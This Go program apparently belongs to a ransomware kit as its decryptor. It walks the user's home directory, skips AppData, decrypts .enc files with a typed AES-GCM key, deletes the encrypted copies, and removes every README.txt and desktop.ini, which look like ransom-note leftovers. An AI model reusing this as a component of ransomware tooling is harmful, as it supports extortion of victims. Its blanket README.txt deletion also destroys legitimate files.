package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	fmt.Print("Enter the decryption key: ")
	var key string
	fmt.Scanln(&key)

	// Initialize AES in GCM mode
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		fmt.Println("Invalid key. Decryption failed.")
		return
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("Error setting up GCM. Decryption failed.")
		return
	}

	// Define the base path as the user's home directory
	basePath, err := os.UserHomeDir()
	if err != nil {
		panic("Could not determine user's home directory")
	}

	// Define the AppData path to exclude
	appDataPath := filepath.Join(basePath, "AppData")

	// Decrypt files and remove README.txt in each directory
	err = filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			fmt.Printf("Error accessing path %s: %v\n", path, err)
			return nil
		}

		// Skip the AppData folder
		if strings.HasPrefix(path, appDataPath) {
			return filepath.SkipDir
		}

		if info.IsDir() {
			// Remove README.txt in the directory
			readmePath := filepath.Join(path, "README.txt")
			if _, err := os.Stat(readmePath); err == nil {
				err := os.Remove(readmePath)
				if err != nil {
					fmt.Printf("Error deleting README.txt in %s: %v\n", path, err)
				} else {
					fmt.Println("Deleted README.txt in " + path)
				}
			}

			// Remove desktop.ini if it exists
			desktopIniPath := filepath.Join(path, "desktop.ini")
			if _, err := os.Stat(desktopIniPath); err == nil {
				err := os.Remove(desktopIniPath)
				if err != nil {
					fmt.Printf("Error deleting desktop.ini in %s: %v\n", path, err)
				} else {
					fmt.Println("Deleted desktop.ini in " + path)
				}
			}
		} else {
			// Handle .enc files for decryption
			if strings.HasSuffix(path, ".enc") {
				fmt.Println("Decrypting " + path + "...")

				// Read encrypted file contents
				encrypted, err := os.ReadFile(path)
				if err != nil {
					fmt.Printf("Error reading encrypted file %s: %v\n", path, err)
					return nil
				}

				// Decrypt file contents
				nonceSize := gcm.NonceSize()
				if len(encrypted) < nonceSize {
					fmt.Printf("Invalid encrypted file format: %s\n", path)
					return nil
				}
				nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
				original, err := gcm.Open(nil, nonce, ciphertext, nil)
				if err != nil {
					fmt.Printf("Error decrypting file %s: %v\n", path, err)
					return nil
				}

				// Write decrypted file contents
				originalPath := strings.TrimSuffix(path, ".enc")
				err = os.WriteFile(originalPath, original, 0644)
				if err != nil {
					fmt.Printf("Error writing decrypted file %s: %v\n", originalPath, err)
					return nil
				}

				// Remove the encrypted file
				err = os.Remove(path)
				if err != nil {
					fmt.Printf("Error deleting encrypted file %s: %v\n", path, err)
				}
			}
		}

		return nil
	})

	if err != nil {
		fmt.Printf("Error during file decryption: %v\n", err)
	} else {
		fmt.Println("Decryption process completed.")
	}
}

